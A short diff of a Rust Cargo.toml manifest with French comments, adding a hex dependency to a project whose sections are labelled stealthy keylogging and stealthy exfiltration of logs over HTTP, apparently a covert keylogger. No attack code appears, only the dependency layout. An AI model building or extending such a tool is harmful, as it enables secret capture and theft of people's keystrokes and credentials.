@@ -4,7 +4,7 @@ version = "0.1.0"
 edition = "2021"
 
 [dependencies]
-# CLI
+# Interface CLI
 clap = { version = "4.4", features = ["derive"] }
 
 # Keylogging furtif
@@ -19,6 +19,7 @@ sha2 = "0.10"         # Hachage SHA256
 pbkdf2 = "0.12"       # Derivation de clé à partir de la passphrase
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
+hex = "0.4"
 
 # Exfiltration furtive des logs
 reqwest = { version = "0.11", features = ["blocking", "json"] }  # Envoi via HTTP
